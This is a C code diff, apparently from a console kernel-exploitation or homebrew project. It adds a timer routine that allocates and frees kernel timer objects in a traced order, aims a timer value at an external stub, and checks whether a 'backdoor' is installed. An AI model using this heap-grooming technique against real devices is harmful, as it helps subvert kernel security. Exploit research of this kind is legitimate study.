@@ -7,6 +7,10 @@
 
 #include "timer.h"
 #include "backdoor.h"
+#include "cleanup.h"
+#include "util.h"
+
+extern void *RandomStub;
 
 static u64 get_tick_offset() {
   /* To find this: run svcGetSystemTick, then do SetTimer(timer, 100000, 100000)
@@ -86,5 +90,81 @@ bool set_timer(Handle timer, u32 kernel_callback_int, u32 carry) {
     return false;
   }
 
+  return true;
+}
+
+bool initialize_timer_state() {
+  Result res;
+  Handle timer;
+
+  /* alloced: timer1 */
+  res = svcCreateTimer(&timer, 0);
+  if (res < 0) {
+    printf("failed to create timer1\n");
+    return false;
+  }
+
+  /* alloced: timer1, timer2 */
+  Handle timer2;
+  res = svcCreateTimer(&timer2, 2);
+  if (res < 0) {
+    printf("failed to create timer2\n");
+    svcCloseHandle(timer);
+    return false;
+  }
+
+  u64 timeout = 0x100000000 | (u32)RandomStub;
+  u32 carry = timeout % 3;
+  timeout /= 3;
+  svcCancelTimer(timer2);
+
+  if (!set_timer(timer2, 0xaaa00000, 0)) {
+    printf("set_timer_test: set_timer failed\n");
+    svcCloseHandle(timer2);
+    svcCloseHandle(timer);
+    return false;
+  }
+
+  if (!set_timer(timer2, (u32)timeout, carry)) {
+    printf("set_timer_test: set_timer failed\n");
+    svcCloseHandle(timer2);
+    svcCloseHandle(timer);
+    return false;
+  }
+
+  if (mybackdoor_installed()) {
+    u64 initial = 0;
+    if (!get_timer_value(timer2, &initial, NULL)) {
+      printf("set_timer_test: get_timer_value failed\n");
+      svcCloseHandle(timer2);
+      svcCloseHandle(timer);
+      return false;
+    }
+
+    u32 target = (u32)((initial) >> 32);
+    if (target != (u32)(void*)RandomStub) {
+      printf("warning: got bad target: %lx\n", target);
+      printf("returning early for debug purposes\n");
+      return false;
+    } else {
+      printf("got good target!\n");
+    }
+    wait_for_user();
+  }
+
+  /* alloced: timer1 */
+  /* freed: timer2 -> ... */
+  res = svcCloseHandle(timer2);
+  if (res < 0) {
+    printf("failed to close timer handle\n");
+    return false;
+  }
+
+  /* freed: timer1 -> timer2 -> ... */
+  res = svcCloseHandle(timer);
+  if (res < 0) {
+    printf("failed to close timer handle\n");
+    return false;
+  }
   return true;
 }
